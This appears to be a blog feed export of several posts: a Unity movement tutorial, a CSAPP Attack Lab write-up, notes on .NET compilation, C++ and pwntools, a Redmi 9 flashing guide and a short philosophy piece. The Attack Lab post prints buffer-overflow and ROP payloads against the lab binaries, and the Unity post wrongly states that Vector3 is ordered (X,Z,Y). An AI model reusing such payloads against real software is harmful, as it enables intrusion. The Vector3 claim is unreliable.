<p>the Start() function will be called when game's first frame is rendered,and never be called excepting you actively call it</p>
<p>the Update function will be called once per frame<strong>(before the next frame is rendered)</strong></p>
<p>and we will use another important function fixedUpdate() instead of Update()</p>
<p>we will see why soon,for now we just need to delete Update(),and write FixedUpdate() instead</p>
<p>OK let's get down</p>
<p>first we need to get playerObject's info when game start, the info like regidbody</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private Rigidbody myBody</span><br><span class="line">void Start()</span><br><span class="line">&#123;</span><br><span class="line">    myBody = GetComponent&lt;Rigidbody&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>then,the OnMove function will read key every time player tap key and store the taping info to a Vector2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void OnMove(InputValue inputEvent)  </span><br><span class="line">&#123;</span><br><span class="line">    Vector2 movementVector = inputEvent.Get&lt;Vector2&gt;();</span><br><span class="line">    axisX = movementVector.x;</span><br><span class="line">    axisY = movementVector.y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>then ,fixedUpdate will apply the vector to force</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void FixedUpdate()</span><br><span class="line">&#123;</span><br><span class="line">    Vector3 movement3 = new Vector3(axisX, 0.0f, axisY);</span><br><span class="line">    myBody.AddForce(movement3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>now you might notice that we keep axisZ==0.0(float),there are few points need to be noticed</p>
<ol type="1">
<li>in vector3 the member var Matrix is (X,Z,Y) ,not (X,Y,Z)</li>
<li>type of arg of AddForce is vector3 ,not vector2;we need to new one vector3</li>
<li>FixedUpdate() will be called every time game need calculate physic system behavior ,noting that physic system calculation is not related to frame Rendering</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056118.png" /></p>
<p>ok,save your script back to unity</p>
<p>click"play",now you see the ball is moving!!!</p>
<p>but there is a problem : the speed is too slow to improve player's experience</p>
<h2 id="change-ball-speed-and-make-speed-can-be-changed-in-unitynot-in-script-editor">change ball-speed and make speed can be changed in unity,not in script editor</h2>
<p>add var speed;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public float speed = 0;</span><br><span class="line">​</span><br><span class="line">​</span><br><span class="line">private void FixedUpdate()</span><br><span class="line">&#123;</span><br><span class="line">    Vector3 movement3 = new Vector3(axisX, 0.0f, axisY);</span><br><span class="line">    myBody.AddForce(movement3 * speed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>public var can be changed in unity Menu</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172057643.png" /></p>
<p>keep increase and test it until speed is fast enough to improve player's experience</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>GamePlay</category>
      </categories>
  </entry>
  <entry>
    <title>Nepnep联合战队PWN见习生报告-第二周</title>
    <url>/nepnep-lian-he-zhan-dui-pwn-jian-xi-sheng-bao-gao-di-er-zhou/</url>
    <content><![CDATA[<h1 id="正文">正文</h1>
<p><strong>（<a href="https://link.zhihu.com/?target=http%3A//csapp.cs.cmu.edu/im/labs/attacklab.tar">Attack Lab</a>[Updated 1/11/16]）</strong></p>
<p>看题目描述我这可来劲了啊!</p>
<p>写ROP什么的最畅快了(大雾)</p>
<p>先下载题目文件<a href="https://www.zhihu.com/search?q=%E5%BA%B7%E5%BA%B7&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A438535451%7D">康康</a></p>
<p>有两个主体文件,总共包含五道题目</p>
<p>直接IDA</p>
<h1 id="第一个文件ctarget">第一个文件ctarget</h1>
<h2 id="第一题touch1">第一题touch1</h2>
<p>先是学到了一个好东西（优秀的开发实现）</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172115050.png" /></p>
<p>is_checker被放在bss段，恒0</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172115282.png" /></p>
<p>不过也不是重点，同时我很难想象啥情况下这个值为true</p>
<p>然后main首先来到这里</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172115435.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181054507.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181054586.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181054202.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181054141.png" /></p>
<p>所以这里是最简单的ret2，不过！且慢！</p>
<p>先来checksec检查一下</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172116124.png" /></p>
<p>这里有canary</p>
<p>但是蹊跷的事情发生了！！</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172116662.png" /></p>
<p>利用点这里并没有canary</p>
<p>稍微翻了一下GCC的文档大概理解了</p>
<p>简单来说，GCC会用一种启发式的算法判断一个函数需不需要canary保护</p>
<p>如果需要则会生成</p>
<figure>
<img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181106463.png" alt="" /><figcaption>img</figcaption>
</figure>
<p>当然也可以选择强制开启all-canary</p>
<p>最终payload很简单，因为这一层题目基本可以认为是没保护的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;A&#x27;* 40 + p64(0x4017C0)</span><br></pre></td></tr></table></figure>
<h2 id="第二题touch2">第二题touch2</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181054785.png" /></p>
<p>这里也比较基础</p>
<p>只需要pop edi;retn就行</p>
<p>先ROP找一下</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172116687.png" /></p>
<p>令0x000000000040141b为变量<code>val_pop_rdi</code></p>
<p>同时因为没开PIE,所以用常数0x4017EC作为函数目标就可以了</p>
<p>画个图看看堆栈的样子</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172116280.png" /></p>
<p>这里的cookie是定值</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181100246.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181054541.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172116597.png" /></p>
<p>在笔者的机器上，值为0x59b997fa</p>
<p>因此payload是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1 = b&#x27;A&#x27;* 40 + p64(val_pop_rdi) + p64(0x59b997fa) + p64(0x4017EC)</span><br></pre></td></tr></table></figure>
<h2 id="第三题touch3">第三题touch3</h2>
<p>这里太麻烦了(其实也没多麻烦,就是要搞个random,得再试验一下本机的random%100,而且考虑到前面已经操作过两三次random的样子,更麻烦了2333)</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172116362.png" /></p>
<p>于是我打算直接劫持validate函数</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172116905.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181054022.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172116512.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1 = b&#x27;A&#x27;* 40 + p64(val_pop_rbx) + p64(0x3) + p64(0x401D41)</span><br></pre></td></tr></table></figure>
<p>总的来说还是比较简单的,因为没啥实质性保护</p>
<h1 id="第二个文件rtarget">第二个文件rtarget</h1>
<p>我写到这里才发现，这里第一个文件的预期解是代码注入，而我直接用ROP的方法做了（毕竟是pwn手）</p>
<p>但是实际上第二个文件的预期解才是ROP</p>
<p>所以这里我就不重复一遍了</p>
<p>（完）</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>笔记</category>
        <category>存档</category>
        <category>二进制</category>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>NepNep</tag>
      </tags>
  </entry>
  <entry>
    <title>.Net,Mono,C# 编译流程及一部分编译原理</title>
    <url>/net-mono-c/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>其实很早之前就奇怪过一个问题:</p>
<p>类似于JAVA,C#这种跨平台性优良的语言,</p>
<p>我可以理解他们的同样一份代码,在不同平台的相同内核的虚拟机上表现相同</p>
<p>但是我无法理解他们能够在这么多不同CPU指令集环境下,维持高效的内核开发进度</p>
<p>这两天看了一些C#相关的编译原理,理解了其中的大部分问题</p>
<h2 id="正文">正文</h2>
<p>首先是梦回JAVA,</p>
<p>在学习基于虚拟机的语言的时候,大多会遇到一堆偏底层的名词,同时有的名词只会出现在特定语言的导论里面,姑且总结其中一些</p>
<ul>
<li>CIL(Common Intermediate Language) 通用中间件语言,可以理解为虚拟机的虚拟机机器码,并非本机环境的实际CPU可读机器码;<strong>通用二字的是因为这项标准是由微软惠普英特尔等巨头起草的</strong></li>
<li>CLI(Common Language Infrastructure)通用语言架构,包含CIL等组件的整个通用语言<strong>架构</strong></li>
<li>Native code 原生码本机CPU直接可读的机器码</li>
<li>Rumtime 运行时 (名词),指的是并非由当前程序开发者直接经手编写的代码/指令,其中包括各种init函数,start函数,和虚拟机环境启动函数以及各种类库</li>
</ul>
<p>然后是查找过程中发现的几篇英语文章,感觉很透彻,一看就懂,翻译(机翻)部分引用如下</p>
<p>机器码：这是最明确的一种。它是使用字节码指令的代码，你的处理器（做实际工作的物理金属片）能够理解并直接执行。所有其他代码必须在你的机器能够执行之前被翻译或转换为机器代码。</p>
<blockquote>
<p>原生码：这个术语有时被用于指机器代码（见上文）的地方。然而，它有时也被用来指非托管代码（见下文）。<br />
<strong>非管理代码和管理代码</strong>：非管理代码指的是用C或C++等编程语言编写的代码，它被直接编译成机器代码。它与托管代码形成对比，后者是用C#、VB.NET、Java或类似的语言编写的，并在虚拟环境（如.NET或JavaVM）中执行，后者有点像在软件中 "模拟 "一个处理器。主要区别在于，托管代码通过使用垃圾收集和保持对对象的引用不透明，为你 "管理 "资源（主要是内存分配）。非托管代码是那种需要你手动分配和取消分配内存的代码，有时会造成内存泄漏（当你忘记取消分配时），有时会造成分段故障（当你过早取消分配时）。无人管理通常也意味着没有对常见的错误进行运行时检查，如空指针解读或数组边界溢出。<br />
严格来说，大多数动态类型的语言--如Perl、Python、PHP和Ruby--也是可管理代码。然而，它们通常不被这样描述，这表明托管代码实际上是真正大的、严肃的、商业编程环境（.NET和Java）的一个营销术语。<br />
汇编代码：这个术语通常指的是人们在真正想写字节码时写的那种源代码。汇编器是一个将这种源代码变成真正的字节码的程序。它不是一个编译器，因为它是1对1的转换。然而，这个术语在使用哪种字节码方面是模糊的：它可能是受管理的或未受管理的。如果是非管理的，产生的字节码是机器码。如果它是受管理的，它的结果是虚拟环境（如.NET）在幕后使用的字节码。管理代码（如C#、Java）被编译成这种特殊的字节码语言，在.NET中被称为通用中间语言（CIL），在Java中被称为Java字节码。通常情况下，普通程序员很少需要访问这种代码或直接用这种语言编写，但当人们这样做时，他们通常将其称为汇编代码，因为他们使用汇编器将其变成字节代码。</p>
</blockquote>
<blockquote>
<p>运行时描述的是在你的程序运行时执行的软件/指令，特别是那些你没有明确写的指令，但对于你的代码的正常执行是必要的。<br />
像C这样的低级语言的runtime非常小（如果有的话）。像Objective-C这样更复杂的语言，允许动态消息传递，有一个更广泛的runtime</p>
</blockquote>
]]></content>
      <categories>
        <category>开发</category>
        <category>GamePlay</category>
      </categories>
  </entry>
  <entry>
    <title>维特根斯坦 分析哲学学《论确实性》：“知道”一词的使用范围与缸中之脑的证伪</title>
    <url>/on-certainty/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>《论确定性》是建立在反对摩尔的理论之上的，先简要介绍一下摩尔的理论：</p>
<blockquote>
<p>根据常识先验性，当我伸出双手的时候，我知道这是我的双手；而因为我知道这是我的双手，所以我拥有感知和判断外部事物能力，所以当我认为我不是缸中之脑的时候，缸中之脑就证伪了，证毕</p>
</blockquote>
<p>至于手是不是可以被缸中之脑模拟的假象，摩尔认为”物体似乎存在"是先验的而非经验的，是不可证伪的</p>
<h2 id="正文">正文</h2>
<p>个人非常认同维特根斯坦的理论，他是这样反对摩尔的：</p>
<p>当我们提出论断：”我知道......“时，本质上来说，是说话人尝试向对方提供或者说帮助对方经验一种，由于智匙的局限性而让说话人认为对方可能尚未经验的信息</p>
<p>比如我提供，“我知道明天会下雨”这句话是有意义的，因为明天的天气是经验的</p>
<p>再比如我提供，“我知道这是一颗树“这句话就是无意义的，因为”客观物体自身是客观物体自身“这个命题是自证先验的，不论”物体似乎存在“是经验的还是先验的，这个命题都是先验的</p>
<p>故部分命题，或换言之，并非所有命题都可以被允许使用知道一词</p>
<p>谨以本文警醒曾经的自己</p>
<h2 id="补充">补充</h2>
<p>现在中文互联网的整体风气用这篇文章的内容可以很好的解释</p>
<p>举个例子</p>
<p>稍微和理工有点关联的话题，如xxx行业如何如何，需要技术改造诸如此类</p>
<p>总会有人把话题千方百计的转移到5G技术，国产操作系统等关键词上</p>
<p>这些转移话题的过程都会运用多个”知道”，而这些“知道”句 均为病句，若能不使用这些病句，笔者相信整个中文互联网圈真正讨论技术本身的内容会在某种意义上得到增长（包括表面上的增长，或者<strong>相对</strong>含量的增长）</p>
<p>因为“何形而上学的讨论都位于意义领域之外，而唯一正确的哲学方法是为自然科学而舍弃哲学”</p>
]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>重写(override)和重载(overload),extern和virtual</title>
    <url>/overrid-eoverload-extern-virtual/</url>
    <content><![CDATA[<p>看书(unity3D脚本编程,黄皮书)看到一句话有点在意</p>
<blockquote>
<p>Mono Runtime 总是知道各个对象的类型是什么,例如调用gettype方法便可获得对象的具体类型。而且由于gettype是一个实例方法，因而一个类型不可能伪装成另一个类型……Alin类不能通过重写gettype方法来返回一个Singer类</p>
</blockquote>
<p>笔者高度怀疑这本书的作者，要是让她现在看这段话，他自己也看不懂这段话的意思</p>
<p>逻辑关系混乱，到底是<strong>不能</strong>还是<strong>可以但没用</strong>,或者换句话来说，Mono Runtime识别一个实例的类型的方法是什么，是调用gettype吗，还是其他专用方法？</p>
<p>经过笔者亲自反汇编相关库，发现如下内容</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181053625.png" /></p>
<p>此外在StackOverflow上面查到了一句话</p>
<blockquote>
<p>C# 重写函数的前提是这个函数是一个虚函数</p>
</blockquote>
<p>但在笔者印象里，C++类继承重写时，可以是虚函数也可以不是虚函数</p>
<p>lab后记录如下</p>
<p>在C++中基类方法不标记虚函数,派生类不标记override,仍可进行重写,基类方法与派生类当中的重名方法均可被正常调用,但IDE会提示C-Tidy</p>
<p>如果是在C#当中,要想重写方法,就必须保证基类方法是virtual的,且为非extern的</p>
<p>不过,如果是重载函数的话,则没有以上的限制,事实上,重载函数几乎没有什么限制</p>
<p>另外记录一个C++中,派生类调用基类的同名方法的办法</p>
<p>类A有方法foo</p>
<p>派生类B又方法foo</p>
<p>b是B的实例,则<code>b.A::foo()</code>即可</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
      <tags>
        <tag>cpp</tag>
      </tags>
  </entry>
  <entry>
    <title>pwntools中symbols，plt，got这三个数组的区别</title>
    <url>/pwntools-zhong-symbols-plt-got-zhe-san-ge-shu-zu-de-qu-bie/</url>
    <content><![CDATA[<p>其实主要是回答symbols数组和plt，got数组的区别</p>
<p>对于pwntools而言，外部符号在symbols数组的内容一般与plt相同</p>
<p>对于内部符号则仅有symbols会标注，plt不负责记录</p>
<p>而got就是got了，也就是plt的跳转对象</p>
]]></content>
      <categories>
        <category>信息安全</category>
        <category>笔记</category>
        <category>存档</category>
        <category>二进制</category>
      </categories>
      <tags>
        <tag>技巧</tag>
        <tag>pwntools</tag>
      </tags>
  </entry>
  <entry>
    <title>Redmi 9 国行版线刷MIUI12.5欧版</title>
    <url>/redmi-9-guo-xing-ban-shua-miui12-5-ou-ban-jiao-cheng-xian-shua/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>用过这款手机的用户应该都能理解为什么要刷国际版,这里不赘述了</p>
<p>我看了一下网上还没有本机型的教程(至少我没找到....)</p>
<p>特此记录</p>
<h2 id="效果">效果</h2>
<p>先来张效果图</p>
<p><a href="https://imgtu.com/i/7VRxUO"><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181105421.jpeg" alt="7VRxUO.jpg" /></a> <a href="https://imgtu.com/i/7VRXb6"><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181105483.jpeg" alt="7VRXb6.jpg" /></a></p>
<h2 id="正文">正文</h2>
<p>以下步骤<strong>全程</strong>请<strong>勿</strong>在连接wifi的情况下进行, 请自行保证手机流量可用</p>
<p>在部分步骤需要<strong>拔掉</strong>手机电话卡(完全断网状态), 会有额外说明</p>
<h3 id="安装驱动">安装驱动</h3>
<p>先有线连接手机一次,选择传输文件,看一下我的电脑里面会不会显示手机储存空间,如果显示了进行下面步骤,如果不显示,请自行购买一根小米<strong>官方</strong>数据线,或换用原厂数据线(如果还在的话)</p>
<p>在这里下载官方工具</p>
<p>https://c.mi.com/oc/miuidownload/detail?guide=2</p>
<p>点击Download <a href="https://cdn.alsgp0.fds.api.mi-img.com/micomm/MiFlash2020-3-14-0.rar">MIUI ROM Flashing Tool</a></p>
<p>下载下来的不一定是最新版,请自行在软件里面检查更新</p>
<p><a href="https://imgtu.com/i/7Vfs6s"><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181105545.png" alt="7Vfs6s.png" /></a></p>
<p>然后在这里安装驱动, 如果提示安装成功,并不一定意味着真的成功了,检测是否成功的办法后文会说,这里默认已经成功了</p>
<p>如果不成功,在电脑的设备驱动这边找一下,可能在USB这里,也可能在other这里,四处找一下,有一项是Android(没有显示小米的型号),选择那一项进去,然后</p>
<ol type="1">
<li>卸载设备</li>
<li>卸载驱动</li>
<li>拔掉数据线</li>
<li>插上数据线,选择传输文件模式</li>
<li>再次查看是否还有这一项(位置可能会变动,比如原本在USB现在跑到other,或者反过来,注意多检查),如果有,属于预期情况,可以按照第六步,如果没有,不属于预期情况,不一定保证第六步无问题,可以先尝试,不行的话,请利用谷歌自行解决驱动安装问题</li>
<li>卸载驱动</li>
<li>手机上面的USB连接方式 从 传输文件 改为 仅充电</li>
<li>拔掉数据线</li>
</ol>
<p>请务必按上述步骤执行</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181105159.png" /></p>
<p>做完之后再用上面的软件安装一次驱动</p>
<p>然后再找一下Android点击更新驱动或者安装驱动(选择自动搜索驱动位置),不同版本的Windows叫法不同</p>
<p>如果一瞬间就完成了,而且没报错,那么你可以进行接下来的步骤</p>
<p>如果卡住了,或者报错了,请自行根据报错码解决</p>
<p>如果无法解决建议重新安装官方win10最新版镜像,毕竟驱动是一种需要三方面的统一配合的软件</p>
<h3 id="解锁bootloaderlock">解锁bootLoaderLock</h3>
<p>https://www.miui.com/unlock/</p>
<p>在这里下载官方解锁工具</p>
<p>下载好之后点更新,更新到最新版,旧版可以删除</p>
<p>拿出手机,进入开发者模式, 然后</p>
<p>设置 -&gt;更多设置 -&gt;开发者选项 -&gt;设备解锁状态</p>
<p>根据提示进行解锁备案,这一步是防止手机倒爷大量解锁的</p>
<p>每位小米用户每年仅可以解锁四台设备</p>
<p>解锁备案完成后,<strong>等待七天,</strong>期间正常使用手机即可</p>
<p>等待期间不要重复备案，会重新计时的</p>
<p>也不要更改手机的SIM电话卡，保持原样，不要卡1卡2换卡槽，也不要更换其他新卡</p>
<p>同时请自行保证卡1有流量可以使用</p>
<p>备案等待过后才可以解锁,如果等待时间不够会提示无法解锁,不会有其他额外的不良影响</p>
<p>等待结束后,备份好手机里面的东西,因为解锁会删除所有东西</p>
<p>提前登录好解锁软件,因为登录需要手机验证码,而解锁需要关机</p>
<p>然后</p>
<ol type="1">
<li>在系统设置的账号那边退出手机上的小米账号、小米相关账号、谷歌账号、谷歌相关账号（如果无法确定是不是相关账号，建议全都退了）</li>
<li>关机</li>
<li>等待30秒以保证完全完成syn</li>
<li>同时按下音量减和开机键进入fastboot模式</li>
<li>插上数据线</li>
</ol>
<p>如果此时软件里面识别到了手机,说明你前面驱动安装成功了</p>
<p>反之未安装成功</p>
<p>假设已经安装成功了</p>
<p>直接按照页面上的提示解锁就行,一定要保证手机上卡1位置插着流量卡</p>
<p>解锁成功后手机就出厂化了，直接开机</p>
<p>开机后，不要连wifi， 不要登录小米账号 ，那些额外的东西，能不点同意的都不要点</p>
<p><strong>然后拔掉SIM卡</strong></p>
<p><strong>在手机设置里点击手机出厂化</strong></p>
<p>同样的，不要连接wifi，不要登录小米账号，不要插SIM卡</p>
<p>不要插SIM卡的状态持续到刷机结束后，成功开机并在无网络状态下设置完手机后</p>
<p>这时候再插SIM卡</p>
<p>然后关机，准备刷机</p>
<h3 id="刷机">刷机</h3>
<p>在这个地方下载官方镜像</p>
<p>https://xiaomirom.com/rom/redmi-9-lancelot-global-fastboot-recovery-rom/</p>
<p>一般选择欧版线刷包最新版即可，如果有其他需求自行选择</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181105830.png" /></p>
<p>下载下来的是TGZ压缩包，自行准备地球人用的解压工具解压即可</p>
<p>解压好的文件夹文件路径会非常长，这会导致官方的刷机软件发生栈溢出报错，请自行修改文件路径，短一些就行，顶级文件夹的名称任意，保证英文路径，无数字无中文无空白符无特殊符号即可</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181105560.png" /></p>
<p>打开前面下载的刷机软件（就是用来安装驱动的那个）</p>
<p>手机关机状态下进入fastboot模式（长按关机和音量减）然后再连接数据线到电脑</p>
<p><a href="https://imgtu.com/i/7V784x"><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181108046.png" alt="7V784x.md.png" /></a></p>
<p>点击加载设备</p>
<p>右下角选择<strong>全部删除</strong></p>
<p>然后直接开始刷机</p>
<p>期间遇到了两个错误码，记录如下</p>
<ol type="1">
<li>https://miuiver.com/error-reading-sparse-file/</li>
<li>https://miuiver.com/miflash-error-not-catch-checkpoint/</li>
</ol>
<p>完成！</p>
<p>好好享受在墙内可以感受到的一丝丝肉身翻墙的感觉吧</p>
<p>笔者是挺想肉身翻墙的呜呜</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>杂谈</category>
        <category>存档</category>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>刷机</tag>
        <tag>安卓</tag>
      </tags>
  </entry>
  <entry>
    <title>大佬教的几个小技巧</title>
    <url>/sometricks/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>前两天林师傅带我做课设的时候，遇到了许多开发上的问题，最终林师傅发动他的算法知识，解决了其中的许多，记录如下</p>
<h2 id="正文">正文</h2>
<p>课设需要实现一个计算器，计算的最终结果需要以分数显示，如果分母为1则显示为整数形式；</p>
<p>需要实现一个整数类和一个派生的分数类</p>
<p>同时需要一个栈存储用户输入的符号</p>
<p>最开始我的做法是定义两个函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void pushFenZi();</span><br><span class="line">void pushFenMu();</span><br></pre></td></tr></table></figure>
<p>然后问题便来了</p>
<p>用户输入的数据长度不定，于是我这个实现需要定义一个Flag，通过确定符号是否输入来确定数据输入是否结束</p>
<p>除了一个数据以外，其余数据都是用两个符号包裹的；而第一个数据只有一个符号包裹，我有需要设置一个firstFlag</p>
<p>诸如此类，最终搞了六七个flag，if层数多得离谱</p>
<p>最终林师傅的改进办法和解决办法的几个要点如下</p>
<p>操作基类相同，但名称不同的两个实例时可以只需要维护一个指针</p>
<p>这样的好处是，如果实例数量不是两个而是一百万个，就会有极大的效率提升</p>
<p>更新:2023年3月17日: 我也不知道当时解决的啥问题, 反正大致思想就是多态可以解决重复定义高相似度代码的问题</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>Third-person view developing</title>
    <url>/third-person-view-developing/</url>
    <content><![CDATA[<p>Normally,binding camera with Player into Third-person view equals to let camera be Player's child ,but in our case the Player moving way is rolling ,so the camera will roll with player ,which is not expected</p>
<h2 id="write-a-script-to-get-and-set-camera-offset-relative-to-player">write a script to get and set camera offset relative to Player</h2>
<p>declare GameObject instance to bind Player<br />
then declare a vector3 var to store offset</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public GameObject player;</span><br><span class="line">private Vector3 m_Offset;</span><br></pre></td></tr></table></figure>
<p>at start function,store initial offset</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void Start()</span><br><span class="line">&#123;</span><br><span class="line">    m_Offset = transform.position - player.transform.position;</span><br><span class="line">    // m_Offset = this.transform.position - player.transform.position;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>then after Player moved,calculate frame(relative to physical system)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void FixedUpdate()</span><br><span class="line">  &#123;</span><br><span class="line">      transform.position = player.transform.position + m_Offset;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>开发</category>
        <category>GamePlay</category>
      </categories>
  </entry>
  <entry>
    <title>三种const</title>
    <url>/three-kind-of-const/</url>
    <content><![CDATA[<h1 id="前言">前言</h1>
<p>本文主要讲的是const和template</p>
<h1 id="正文">正文</h1>
<h3 id="模板的重载">模板的重载</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;vector&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">class students&#123;</span><br><span class="line">public:</span><br><span class="line">    void printID()&#123;</span><br><span class="line">        cout&lt;&lt;ID;</span><br><span class="line">    &#125;</span><br><span class="line">    void printName()&#123;</span><br><span class="line">        cout&lt;&lt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    int getID() const&#123;</span><br><span class="line">        return ID;</span><br><span class="line">    &#125;</span><br><span class="line">private:</span><br><span class="line">    int ID;</span><br><span class="line">    string name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">template&lt;typename T&gt; T const&amp; Max(T const&amp; a,T const&amp; b)&#123;</span><br><span class="line">    return a&lt;b?b:a;</span><br><span class="line">&#125;</span><br><span class="line">template&lt;typename T&gt; int  Max(students const&amp; a,students const&amp; b)&#123;</span><br><span class="line">    return a.getID()&lt;b.getID()?b.getID():a.getID();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="三种const">三种const</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;vector&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">class students&#123;</span><br><span class="line">public:</span><br><span class="line">    void printID()&#123;</span><br><span class="line">        cout&lt;&lt;ID;</span><br><span class="line">    &#125;</span><br><span class="line">    void printName()&#123;</span><br><span class="line">        cout&lt;&lt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    int getID() const&#123;</span><br><span class="line">        return ID;</span><br><span class="line">    &#125;</span><br><span class="line">private:</span><br><span class="line">    int ID;</span><br><span class="line">    string name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">template&lt;typename T&gt; T const&amp; Max(T const&amp; a,T const&amp; b)&#123;</span><br><span class="line">    return a&lt;b?b:a;</span><br><span class="line">&#125;</span><br><span class="line">template&lt;typename T&gt; int  Max(students const&amp; a,students const&amp; b)&#123;</span><br><span class="line">    return a.getID()&lt;b.getID()?b.getID():a.getID();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>来看下面这个声明</p>
<p><code>Student const&amp; Choose(Student const&amp; a1,Student const&amp; a2 ) const;</code></p>
<ol type="1">
<li><code>Student const&amp; Choose</code> 中 const含义为返回值不可被变更,且返回值只能被赋值给同样被const修饰的指针</li>
<li>参数当中的const代表这个按引用传递的参数的值在整个函数体当中不可被更改</li>
<li>函数声明最末尾的const表明这整个函数是只读函数(read-only),这个标记符会帮助编译器检查函数体当中有没有修改任何成员变量的操作,如果有则会报错,同时这个标记符还会帮助其他程序员理解这个函数的功能</li>
</ol>
]]></content>
      <categories>
        <category>笔记</category>
        <category>开发</category>
        <category>C++</category>
        <category>短笔记</category>
      </categories>
      <tags>
        <tag>cpp</tag>
        <tag>悬而未决</tag>
        <tag>需要修改</tag>
      </tags>
  </entry>
  <entry>
    <title>Verilog的数据类型中x,y的含义</title>
    <url>/verilog-de-shu-ju-lei-xing-zhong-xy-de-han-yi/</url>
    <content><![CDATA[<p><位宽>‘<进制><数字></p>
<p><strong>x值和z值：</strong>在数字电路中，x代表不定值，z代表高阻值。一个x可以定义十六进制的4位，八进制的3位，二进制的一位（十进制暂时未知）。z的表示方式同x相同，另外z亦可以用“？”来表示。（case块中用得较多）</p>
<p>4'b10x0            //位宽为4的二进制数从低位数起第二位为不定值</p>
<p>4'b101z            //位宽为4的二进制数从低位数起第一位为高阻值</p>
